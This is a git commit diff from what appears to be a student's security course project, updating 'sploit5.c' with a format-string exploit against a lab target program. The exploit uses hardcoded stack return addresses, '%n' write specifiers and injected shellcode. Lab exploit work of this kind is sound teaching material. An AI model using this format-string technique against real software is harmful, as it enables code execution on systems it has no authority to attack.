be4dd3a7356a0821e3595f8c80d2280fd32a738e
Bryan Cheng <bryan.b.cheng@gmail.com>
2014-04-07 17:16:08 +0000

    finished num 5

--- proj1/sploits/sploit5.c
+++ proj1/sploits/sploit5.c
@@ -11,7 +11,16 @@ int main(void)
   char *args[3];
   char *env[1];
 
-  char *exploit = "\x44\xfe\xff\xbf%08x.%08x.%08x.%08x.%08x";
+  // retAddr should be the address of $ebp + 4
+  char *retAddr = "\1\1\1\1\xf4\xfd\xff\xbf\1\1\1\1\xf5\xfd\xff\xbf\1\1\1\1\xf6\xfd\xff\xbf\1\1\1\1\xf7\xfd\xff\xbf";
+  char *override = "%51d%n%124d%n%259d%n%192d%n";
+  int len = strlen(retAddr) + strlen(override) + sizeof(shellcode);
+  char exploit[len];
+  memcpy(exploit, retAddr, strlen(retAddr));
+  memcpy(exploit + strlen(retAddr), shellcode, sizeof(shellcode) - 1);
+  memcpy(exploit + strlen(retAddr) + sizeof(shellcode) - 1, override, strlen(override));
+  //memcpy(exploit + strlen(retAddr) + strlen(override), shellcode, sizeof(shellcode) - 1);
+  exploit[len - 1] = '\0';
 
   args[0] = TARGET; args[1] = exploit; args[2] = NULL;
   env[0] = NULL;
